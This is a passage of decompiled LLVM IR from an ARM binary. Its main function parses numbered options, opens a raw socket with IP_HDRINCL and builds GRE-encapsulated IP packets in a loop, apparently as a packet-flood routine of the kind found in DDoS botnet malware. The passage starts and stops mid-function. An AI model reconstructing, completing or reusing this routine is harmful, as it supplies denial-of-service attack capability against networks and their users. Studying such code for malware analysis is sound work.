  uselistorder i32 %v3_b864, { 1, 0, 2 }
  uselistorder i32 %v3_b844, { 1, 0 }
  uselistorder i32 %tmp92, { 1, 0 }
  uselistorder i32 %v1_b7e8, { 1, 0 }
  uselistorder i32 %v1_b7e4, { 2, 1, 0 }
  uselistorder i32 %v1_b7d0, { 1, 0 }
  uselistorder i32 %v1_b7cc, { 2, 1, 0 }
  uselistorder i32 %v1_b7c4, { 0, 2, 1 }
  uselistorder i32 %v3_b7bc, { 2, 1, 0 }
  uselistorder i32 %v0_b798, { 1, 0, 2 }
  uselistorder i32 %v3_b78c, { 2, 1, 3, 0 }
  uselistorder i32 %v1_b784, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v3_b780, { 2, 0, 1 }
  uselistorder i32 %v0_b780, { 2, 1, 0 }
  uselistorder i32 %v0_b778, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_b774, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_b76c, { 1, 0 }
  uselistorder i1 %v7_b740, { 1, 0 }
  uselistorder i32 %v3_b73c, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_b728, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_b6f4, { 1, 2, 0 }
  uselistorder i32 %v5_b6d4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_b688, { 1, 0 }
  uselistorder i8 %v5_b678, { 1, 0 }
  uselistorder i32 %v5_b65c, { 1, 0 }
  uselistorder i32 %v6_b620, { 1, 0 }
  uselistorder i32 %v4_b608, { 0, 3, 1, 2 }
  uselistorder i32 %v1_b5ec, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 1, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 47, 46, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 39, 40, 42, 41, 43, 44, 46, 45, 48, 47, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 6, 7, 4, 5, 9, 8, 10, 13, 11, 12, 14, 16, 15, 17, 19, 18, 20, 21, 22, 23, 25, 24, 29, 26, 27, 28, 32, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder label %dec_label_pc_bd28, { 1, 0 }
  uselistorder label %bb109, { 1, 0 }
  uselistorder label %dec_label_pc_bc24, { 1, 0 }
  uselistorder label %dec_label_pc_bb48, { 1, 0 }
  uselistorder label %dec_label_pc_bae4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ba54.preheader, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %bb101, { 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
}

define i32 @function_bd64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_bd64:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_bd64 = load i32, i32* @r4, align 4
  %v6_bd64 = load i32, i32* @r5, align 4
  %v9_bd64 = load i32, i32* @r6, align 4
  %v12_bd64 = load i32, i32* @r7, align 4
  %v15_bd64 = load i32, i32* @r8, align 4
  %v1_bd68 = urem i32 %arg1, 256
  store i32 %v1_bd68, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v1_bd68, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_bd80 = urem i32 %arg3, 256
  store i32 %v1_bd80, i32* @r4, align 4
  %v2_bd84 = call i32* @calloc(i32 %v1_bd68, i32 4)
  %v4_bd84 = ptrtoint i32* %v2_bd84 to i32
  %v0_bd88 = load i32, i32* @r5, align 4
  store i32 %v0_bd88, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bd98 = load i32, i32* @r4, align 4
  store i32 %v0_bd98, i32* %r0.global-to-local, align 4
  %v5_bd9c = inttoptr i32 %v0_bd88 to i32*
  %v6_bd9c = call i32 @function_b240(i32 %v0_bd98, i32* %v5_bd9c, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bdb4 = load i32, i32* @r5, align 4
  store i32 %v0_bdb4, i32* %r1.global-to-local, align 4
  %v0_bdb8 = load i32, i32* @r4, align 4
  store i32 %v0_bdb8, i32* %r0.global-to-local, align 4
  %v5_bdbc = trunc i32 %v6_bd9c to i8
  %v6_bdc0 = inttoptr i32 %v0_bdb4 to i32*
  %v7_bdc0 = call i32 @function_b240(i32 %v0_bdb8, i32* %v6_bdc0, i32 3, i32 65535)
  %v0_bdc4 = load i32, i32* @r5, align 4
  store i32 %v0_bdc4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bdc0, i32* @r7, align 4
  %v0_bdd4 = load i32, i32* @r4, align 4
  store i32 %v0_bdd4, i32* %r0.global-to-local, align 4
  %v4_bdd8 = inttoptr i32 %v0_bdc4 to i32*
  %v5_bdd8 = call i32 @function_b240(i32 %v0_bdd4, i32* %v4_bdd8, i32 4, i32 64)
  %v0_bde4 = load i32, i32* @r5, align 4
  store i32 %v0_bde4, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bdf0 = load i32, i32* @r4, align 4
  store i32 %v0_bdf0, i32* %r0.global-to-local, align 4
  %v5_bdf4 = trunc i32 %v5_bdd8 to i8
  %v6_bdf8 = inttoptr i32 %v0_bde4 to i32*
  %v7_bdf8 = call i32 @function_b240(i32 %v0_bdf0, i32* %v6_bdf8, i32 5, i32 1)
  %v1_be04 = urem i32 %v7_bdf8, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_be10 = load i32, i32* @r5, align 4
  store i32 %v0_be10, i32* %r1.global-to-local, align 4
  %v0_be14 = load i32, i32* @r4, align 4
  store i32 %v0_be14, i32* %r0.global-to-local, align 4
  %v5_be1c = inttoptr i32 %v0_be10 to i32*
  %v6_be1c = call i32 @function_b240(i32 %v0_be14, i32* %v5_be1c, i32 6, i32 65535)
  %v0_be24 = load i32, i32* @r5, align 4
  store i32 %v0_be24, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_be1c, i32* @sl, align 4
  %v0_be34 = load i32, i32* @r4, align 4
  store i32 %v0_be34, i32* %r0.global-to-local, align 4
  %v4_be38 = inttoptr i32 %v0_be24 to i32*
  %v5_be38 = call i32 @function_b240(i32 %v0_be34, i32* %v4_be38, i32 7, i32 65535)
  %v0_be3c = load i32, i32* @r5, align 4
  store i32 %v0_be3c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_be38, i32* @r8, align 4
  %v0_be4c = load i32, i32* @r4, align 4
  store i32 %v0_be4c, i32* %r0.global-to-local, align 4
  %v4_be50 = inttoptr i32 %v0_be3c to i32*
  %v5_be50 = call i32 @function_b240(i32 %v0_be4c, i32* %v4_be50, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_be60 = load i32, i32* @r5, align 4
  store i32 %v0_be60, i32* %r1.global-to-local, align 4
  %v0_be64 = load i32, i32* @r4, align 4
  store i32 %v0_be64, i32* %r0.global-to-local, align 4
  %v4_be68 = inttoptr i32 %v0_be60 to i32*
  %v5_be68 = call i32 @function_b240(i32 %v0_be64, i32* %v4_be68, i32 1, i32 1)
  %v1_be70 = urem i32 %v5_be68, 256
  %v0_be74 = load i32, i32* @r5, align 4
  store i32 %v0_be74, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_be80 = load i32, i32* @r4, align 4
  store i32 %v0_be80, i32* %r0.global-to-local, align 4
  %v5_be88 = inttoptr i32 %v0_be74 to i32*
  %v6_be88 = call i32 @function_b240(i32 %v0_be80, i32* %v5_be88, i32 19, i32 0)
  %v0_be90 = load i32, i32* @r5, align 4
  store i32 %v0_be90, i32* %r1.global-to-local, align 4
  %v2_be94 = load i32, i32* @global_var_1cd48.140, align 4
  store i32 %v2_be94, i32* %r3.global-to-local, align 4
  store i32 %v6_be88, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_bea0 = load i32, i32* @r4, align 4
  store i32 %v0_bea0, i32* %r0.global-to-local, align 4
  %v4_bea4 = inttoptr i32 %v0_be90 to i32*
  %v5_bea4 = call i32 @function_b240(i32 %v0_bea0, i32* %v4_bea4, i32 25, i32 %v2_be94)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_beb8 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_beb8, i32* %r0.global-to-local, align 4
  %v7_bebc = icmp eq i32 %v3_beb8, -1
  store i1 %v7_bebc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bebc, label %dec_label_pc_c33c, label %dec_label_pc_bec8

dec_label_pc_bec8:                                ; preds = %dec_label_pc_bd64
  store i32 1, i32* %stack_var_-40, align 4
  %v6_bed0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_bed0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_bee4 = call i32 @setsockopt(i32 %v3_beb8, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_bee4, i32* %r0.global-to-local, align 4
  %v7_bee8 = icmp eq i32 %v7_bee4, -1
  store i1 %v7_bee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bee8, label %dec_label_pc_c334, label %dec_label_pc_bef0

dec_label_pc_bef0:                                ; preds = %dec_label_pc_bec8
  %v0_bef0 = load i32, i32* @sl, align 4
  %v0_befc = load i32, i32* @r8, align 4
  %v3_befc = mul i32 %v0_befc, 65536
  store i32 %v3_befc, i32* %r8.global-to-local, align 4
  %v0_bf00 = load i32, i32* @r7, align 4
  %v3_bf00 = mul i32 %v0_bf00, 65536
  store i32 %v3_bf00, i32* %r7.global-to-local, align 4
  %v0_bf04 = load i32, i32* @r6, align 4
  %v1_bf04 = urem i32 %v0_bf04, 256
  store i32 %v1_bf04, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_bf0c = urem i32 %v0_bef0, 65536
  store i32 %v3_bf0c, i32* %r2.global-to-local, align 4
  %v3_bf10 = urem i32 %v0_befc, 65536
  store i32 %v3_bf10, i32* %r3.global-to-local, align 4
  %v0_bf14 = load i32, i32* @fp, align 4
  %v2_bf14 = icmp eq i32 %v0_bf14, 0
  store i1 %v2_bf14, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %v3_bf24 = urem i32 %v0_bf00, 65536
  store i32 %v3_bf24, i32* @sl, align 4
  %tmp85 = icmp slt i32 %v0_bf14, 1
  br i1 %tmp85, label %dec_label_pc_c460, label %dec_label_pc_bf34

dec_label_pc_bf34:                                ; preds = %dec_label_pc_bef0
  %v3_bf38 = mul i32 %v5_be50, 65536
  %v1_bf3c = add i32 %v3_bf38, 3407872
  %v3_bf44 = udiv i32 %v1_bf3c, 256
  %v0_bf00.not = or i32 %v0_bf00, -65536
  %v1_bf54 = xor i32 %v0_bf00.not, 65535
  %v1_bf58 = urem i32 %v0_befc, 256
  %tmp86 = mul nsw i32 %v1_bf54, 256
  %v1_bf70 = and i32 %v3_bf44, 65280
  %v1_bf74 = add i32 %v3_bf38, 524288
  %v4_bf78 = udiv i32 %v1_bf3c, 16777216
  %v5_bf78 = or i32 %v1_bf70, %v4_bf78
  store i32 %v5_bf78, i32* %r0.global-to-local, align 4
  %v1_bf7c = add i32 %v3_bf38, 1835008
  %v1_bf84 = and i32 %tmp86, 65280
  store i32 %v1_bf84, i32* %lr.global-to-local, align 4
  %tmp87 = udiv i32 %v1_bf54, 256
  %tmp88 = udiv i32 %v0_bf00, 256
  %v5_bf98 = trunc i32 %tmp87 to i8
  %tmp89 = udiv i32 %v0_bef0, 256
  %sext30 = mul i32 %tmp88, 16777216
  %v4_bfb8 = sdiv i32 %sext30, 16777216
  %v3_bfc4 = mul nuw nsw i32 %v1_bf58, 256
  store i32 %v3_bfc4, i32* %r5.global-to-local, align 4
  %v3_bfc8 = udiv i32 %v1_bf74, 256
  %tmp90 = udiv i32 %v0_befc, 256
  %v4_bfd0 = urem i32 %tmp90, 256
  %v5_bfd0 = or i32 %v4_bfd0, %v3_bfc4
  store i32 %v5_bfd0, i32* %r7.global-to-local, align 4
  %v3_bfd4 = ashr i32 %sext30, 31
  %v3_bfe0 = sdiv i32 %v1_bf7c, 16777216
  %v1_bfe4 = and i32 %v3_bfc8, 65280
  store i32 %v1_bfe4, i32* %r6.global-to-local, align 4
  %sext31 = mul i32 %tmp89, 16777216
  %v4_bfec = sdiv i32 %sext31, 16777216
  %v3_bff0 = ashr i32 %v1_bf7c, 31
  %v3_bff4 = udiv i32 %v1_bf54, 65536
  %v4_bff8 = udiv i32 %v1_bf74, 16777216
  %v5_bff8 = or i32 %v1_bfe4, %v4_bff8
  store i32 %v5_bff8, i32* %r8.global-to-local, align 4
  %v3_c004 = ashr i32 %sext31, 31
  store i32 %v3_c004, i32* %r1.global-to-local, align 4
  store i32 %v1_bf58, i32* %r2.global-to-local, align 4
  %v3_c00c42 = udiv i32 %v1_bfe4, 256
  store i32 %v3_c00c42, i32* %r3.global-to-local, align 4
  %v5_c014 = trunc i32 %v3_c004 to i8
  store i32 0, i32* %r4.global-to-local, align 4
  %v4_c070 = sext i8 %v5_bdf4 to i32
  %sext = mul i32 %v1_bf3c, 256
  %v4_c078 = sdiv i32 %sext, 16777216
  %sext17 = mul nuw i32 %v4_bf78, 16777216
  %v4_c088 = sdiv i32 %sext17, 16777216
  %v2_c15c = icmp eq i32 %v1_bf04, 0
  %sext21 = mul i32 %v1_bf74, 256
  %v4_c17c = sdiv i32 %sext21, 16777216
  %sext22 = mul i32 %v0_befc, 16777216
  %v7_c194 = sdiv i32 %sext22, 16777216
  %v1_c084 = trunc i32 %v4_c078 to i8
  br label %dec_label_pc_c024

dec_label_pc_c024:                                ; preds = %bb97, %dec_label_pc_bf34
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_c030 = call i32* @calloc(i32 1510, i32 4)
  %v4_c030 = ptrtoint i32* %v2_c030 to i32
  store i32 %v4_c030, i32* %r0.global-to-local, align 4
  store i32 %v4_bd84, i32* %r1.global-to-local, align 4
  %v3_c038 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c038, i32* %r3.global-to-local, align 4
  %v2_c03c = load i32, i32* %r4.global-to-local, align 4
  %v5_c03c = mul i32 %v2_c03c, 4
  %v6_c03c = add i32 %v5_c03c, %v4_bd84
  %v7_c03c = inttoptr i32 %v6_c03c to i32*
  store i32 %v4_c030, i32* %v7_c03c, align 4
  %v0_c040 = load i32, i32* %r1.global-to-local, align 4
  %v1_c040 = load i32, i32* %r3.global-to-local, align 4
  %v4_c040 = mul i32 %v1_c040, 4
  %v5_c040 = add i32 %v4_c040, %v0_c040
  %v6_c040 = inttoptr i32 %v5_c040 to i32*
  %v7_c040 = load i32, i32* %v6_c040, align 4
  store i32 %v7_c040, i32* %r4.global-to-local, align 4
  %v1_c044 = inttoptr i32 %v7_c040 to i8*
  %v2_c044 = load i8, i8* %v1_c044, align 1
  %tmp = urem i8 %v2_c044, 16
  %v1_c048 = zext i8 %tmp to i32
  %v1_c04c = or i32 %v1_c048, 64
  store i32 %v1_c04c, i32* %r2.global-to-local, align 4
  %v1_c050 = trunc i32 %v1_c04c to i8
  store i8 %v1_c050, i8* %v1_c044, align 1
  %v0_c054 = load i32, i32* %r4.global-to-local, align 4
  %v1_c054 = inttoptr i32 %v0_c054 to i8*
  %v2_c054 = load i8, i8* %v1_c054, align 1
  %v1_c058 = and i8 %v2_c054, -16
  %v1_c05c = or i8 %v1_c058, 5
  store i32 %v1_be04, i32* %r2.global-to-local, align 4
  store i8 %v1_c05c, i8* %v1_c054, align 1
  %v2_c06c = load i32, i32* %r4.global-to-local, align 4
  %v3_c06c = add i32 %v2_c06c, 1
  %v4_c06c = inttoptr i32 %v3_c06c to i8*
  store i8 %v5_bdbc, i8* %v4_c06c, align 1
  store i32 %v4_c070, i32* %r1.global-to-local, align 4
  %v2_c074 = load i32, i32* %r4.global-to-local, align 4
  %v3_c074 = add i32 %v2_c074, 8
  %v4_c074 = inttoptr i32 %v3_c074 to i8*
  store i8 %v5_bdf4, i8* %v4_c074, align 1
  store i32 %v4_c078, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_c080 = load i32, i32* %r2.global-to-local, align 4
  %v9_c080 = icmp eq i32 %v0_c080, 0
  store i1 %v9_c080, i1* %cpsr_z.global-to-local, align 1
  %v2_c084 = load i32, i32* %r4.global-to-local, align 4
  %v3_c084 = add i32 %v2_c084, 3
  %v4_c084 = inttoptr i32 %v3_c084 to i8*
  store i8 %v1_c084, i8* %v4_c084, align 1
  store i32 %v4_c088, i32* %r2.global-to-local, align 4
  %v0_c08c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c08c, label %.thread24, label %.thread

.thread:                                          ; preds = %dec_label_pc_c024
  %v1_c08c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_c08c, i32* %r3.global-to-local, align 4
  %v2_c090 = trunc i32 %v1_c08c to i8
  %v3_c090 = load i32, i32* %r4.global-to-local, align 4
  %v4_c090 = add i32 %v3_c090, 7
  %v5_c090 = inttoptr i32 %v4_c090 to i8*
  store i8 %v2_c090, i8* %v5_c090, align 1
  %v0_c094.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c094.pr.pr, label %.thread24, label %bb

bb:                                               ; preds = %.thread
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c098 = load i32, i32* %r4.global-to-local, align 4
  %v4_c098 = add i32 %v3_c098, 6
  %v5_c098 = inttoptr i32 %v4_c098 to i8*
  store i8 64, i8* %v5_c098, align 1
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_c024, %.thread, %bb
  %v0_c09c = load i32, i32* %r2.global-to-local, align 4
  %v1_c09c = trunc i32 %v0_c09c to i8
  %v2_c09c = load i32, i32* %r4.global-to-local, align 4
  %v3_c09c = add i32 %v2_c09c, 2
  %v4_c09c = inttoptr i32 %v3_c09c to i8*
  store i8 %v1_c09c, i8* %v4_c09c, align 1
  store i32 %v3_bfd4, i32* %r2.global-to-local, align 4
  store i32 %v4_bfb8, i32* %r1.global-to-local, align 4
  %v2_c0ac = load i32, i32* %r4.global-to-local, align 4
  %v3_c0ac = add i32 %v2_c0ac, 9
  %v4_c0ac = inttoptr i32 %v3_c0ac to i8*
  store i8 47, i8* %v4_c0ac, align 1
  %v0_c0b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0b0 = trunc i32 %v0_c0b0 to i8
  %v2_c0b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_c0b0 = add i32 %v2_c0b0, 5
  %v4_c0b0 = inttoptr i32 %v3_c0b0 to i8*
  store i8 %v1_c0b0, i8* %v4_c0b0, align 1
  %v3_c0b4 = load i32, i32* %stack_var_-40, align 4
  %v5_c0bc = mul i32 %v3_c0b4, 24
  store i32 %v5_c0bc, i32* %r3.global-to-local, align 4
  store i32 %v5_bea4, i32* %r2.global-to-local, align 4
  %v1_c0c4 = load i32, i32* %r4.global-to-local, align 4
  %v2_c0c4 = add i32 %v1_c0c4, 12
  %v3_c0c4 = inttoptr i32 %v2_c0c4 to i32*
  store i32 %v5_bea4, i32* %v3_c0c4, align 4
  %v0_c0c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_c0c8 = load i32, i32* @sb, align 4
  %v2_c0c8 = add i32 %v1_c0c8, %v0_c0c8
  store i32 %v2_c0c8, i32* %r3.global-to-local, align 4
  %v0_c0cc = load i32, i32* %r1.global-to-local, align 4
  %v1_c0cc = trunc i32 %v0_c0cc to i8
  %v2_c0cc = load i32, i32* %r4.global-to-local, align 4
  %v3_c0cc = add i32 %v2_c0cc, 4
  %v4_c0cc = inttoptr i32 %v3_c0cc to i8*
  store i8 %v1_c0cc, i8* %v4_c0cc, align 1
  %v0_c0d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c0d0 = add i32 %v0_c0d0, 16
  %v2_c0d0 = inttoptr i32 %v1_c0d0 to i32*
  %v3_c0d0 = load i32, i32* %v2_c0d0, align 4
  store i32 %v3_c0d0, i32* %r2.global-to-local, align 4
  %v0_c0d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_c0d4 = add i32 %v0_c0d4, 20
  store i32 %v1_c0d4, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_c0dc = load i32, i32* %r0.global-to-local, align 4
  %v1_c0dc = trunc i32 %v0_c0dc to i8
  %v3_c0dc = add i32 %v0_c0d4, 23
  %v4_c0dc = inttoptr i32 %v3_c0dc to i8*
  store i8 %v1_c0dc, i8* %v4_c0dc, align 1
  %v0_c0e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c0e0 = trunc i32 %v0_c0e0 to i8
  %v2_c0e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_c0e0 = add i32 %v2_c0e0, 2
  %v4_c0e0 = inttoptr i32 %v3_c0e0 to i8*
  store i8 %v1_c0e0, i8* %v4_c0e0, align 1
  %v0_c0e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_c0e4 = add i32 %v0_c0e4, 24
  %v2_c0e4 = inttoptr i32 %v1_c0e4 to i8*
  %v3_c0e4 = load i8, i8* %v2_c0e4, align 1
  %tmp105 = urem i8 %v3_c0e4, 16
  %v1_c0e8 = zext i8 %tmp105 to i32
  %v1_c0ec = or i32 %v1_c0e8, 64
  store i32 %v1_c0ec, i32* %r3.global-to-local, align 4
  %v1_c0f0 = trunc i32 %v1_c0ec to i8
  store i8 %v1_c0f0, i8* %v2_c0e4, align 1
  %v0_c0f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_c0f4 = add i32 %v1_c0f4, 16
  %v3_c0f4 = inttoptr i32 %v2_c0f4 to i32*
  store i32 %v0_c0f4, i32* %v3_c0f4, align 4
  %v0_c0f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c0f8 = add i32 %v0_c0f8, 24
  %v2_c0f8 = inttoptr i32 %v1_c0f8 to i8*
  %v3_c0f8 = load i8, i8* %v2_c0f8, align 1
  %v1_c0fc = and i8 %v3_c0f8, -16
  %v1_c100 = or i8 %v1_c0fc, 5
  store i8 %v1_c100, i8* %v2_c0f8, align 1
  %v0_c10c = load i32, i32* %r4.global-to-local, align 4
  %v1_c10c = add i32 %v0_c10c, 24
  store i32 %v1_c10c, i32* %r5.global-to-local, align 4
  %v3_c110 = add i32 %v0_c10c, 25
  %v4_c110 = inttoptr i32 %v3_c110 to i8*
  store i8 %v5_bdbc, i8* %v4_c110, align 1
  store i32 %v3_bfe0, i32* %r1.global-to-local, align 4
  store i32 %tmp87, i32* %r3.global-to-local, align 4
  store i32 %v3_bff0, i32* %r2.global-to-local, align 4
  %v2_c120 = load i32, i32* %r5.global-to-local, align 4
  %v3_c120 = add i32 %v2_c120, 4
  %v4_c120 = inttoptr i32 %v3_c120 to i8*
  store i8 %v5_bf98, i8* %v4_c120, align 1
  %v0_c124 = load i32, i32* %r1.global-to-local, align 4
  %v1_c124 = trunc i32 %v0_c124 to i8
  %v2_c124 = load i32, i32* %r5.global-to-local, align 4
  %v3_c124 = add i32 %v2_c124, 2
  %v4_c124 = inttoptr i32 %v3_c124 to i8*
  store i8 %v1_c124, i8* %v4_c124, align 1
  %v0_c128 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c128, label %bb92, label %bb91

bb91:                                             ; preds = %.thread24
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb92

bb92:                                             ; preds = %.thread24, %bb91
  store i32 %v3_bff4, i32* %r1.global-to-local, align 4
  %v0_c130 = load i32, i32* %r2.global-to-local, align 4
  %v1_c130 = trunc i32 %v0_c130 to i8
  %v2_c130 = load i32, i32* %r5.global-to-local, align 4
  %v3_c130 = add i32 %v2_c130, 3
  %v4_c130 = inttoptr i32 %v3_c130 to i8*
  store i8 %v1_c130, i8* %v4_c130, align 1
  store i32 %v4_c070, i32* %r2.global-to-local, align 4
  %v0_c138 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c138, label %bb94, label %bb93

bb93:                                             ; preds = %bb92
  %v1_c138 = load i32, i32* %r3.global-to-local, align 4
  %v2_c138 = trunc i32 %v1_c138 to i8
  %v3_c138 = load i32, i32* %r5.global-to-local, align 4
  %v4_c138 = add i32 %v3_c138, 6
  %v5_c138 = inttoptr i32 %v4_c138 to i8*
  store i8 %v2_c138, i8* %v5_c138, align 1
  br label %bb94

bb94:                                             ; preds = %bb92, %bb93
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_c140 = load i32, i32* %r1.global-to-local, align 4
  %v1_c140 = trunc i32 %v0_c140 to i8
  %v2_c140 = load i32, i32* %r5.global-to-local, align 4
  %v3_c140 = add i32 %v2_c140, 5
  %v4_c140 = inttoptr i32 %v3_c140 to i8*
  store i8 %v1_c140, i8* %v4_c140, align 1
  %v0_c144 = load i32, i32* %r2.global-to-local, align 4
  %v1_c144 = trunc i32 %v0_c144 to i8
  %v2_c144 = load i32, i32* %r5.global-to-local, align 4
  %v3_c144 = add i32 %v2_c144, 8
  %v4_c144 = inttoptr i32 %v3_c144 to i8*
  store i8 %v1_c144, i8* %v4_c144, align 1
  %v0_c148 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c148, label %bb96, label %bb95

bb95:                                             ; preds = %bb94
  %v1_c148 = load i32, i32* %r0.global-to-local, align 4
  %v2_c148 = trunc i32 %v1_c148 to i8
  %v3_c148 = load i32, i32* %r5.global-to-local, align 4
  %v4_c148 = add i32 %v3_c148, 7
  %v5_c148 = inttoptr i32 %v4_c148 to i8*
  store i8 %v2_c148, i8* %v5_c148, align 1
  br label %bb96

bb96:                                             ; preds = %bb94, %bb95
  %v0_c14c = load i32, i32* %r3.global-to-local, align 4
  %v1_c14c = trunc i32 %v0_c14c to i8
  %v2_c14c = load i32, i32* %r5.global-to-local, align 4
  %v3_c14c = add i32 %v2_c14c, 9
  %v4_c14c = inttoptr i32 %v3_c14c to i8*
  store i8 %v1_c14c, i8* %v4_c14c, align 1
  %v0_c150 = call i32 @function_10b68()
  store i32 %v0_c150, i32* %r0.global-to-local, align 4
  store i32 %v1_bf04, i32* %r1.global-to-local, align 4
  store i1 %v2_c15c, i1* %cpsr_z.global-to-local, align 1
  %v1_c160 = sub i32 1023, %v0_c150
  store i32 %v1_c160, i32* %r3.global-to-local, align 4
  br i1 %v2_c15c, label %.thread25, label %.thread26

.thread25:                                        ; preds = %bb96
  %v2_c168 = load i32, i32* %r5.global-to-local, align 4
  %v3_c168 = add i32 %v2_c168, 16
  %v4_c168 = inttoptr i32 %v3_c168 to i32*
  store i32 %v1_c160, i32* %v4_c168, align 4
  br label %bb97

.thread26:                                        ; preds = %bb96
  %v1_c164 = load i32, i32* %r4.global-to-local, align 4
  %v2_c164 = add i32 %v1_c164, 16
  %v3_c164 = inttoptr i32 %v2_c164 to i32*
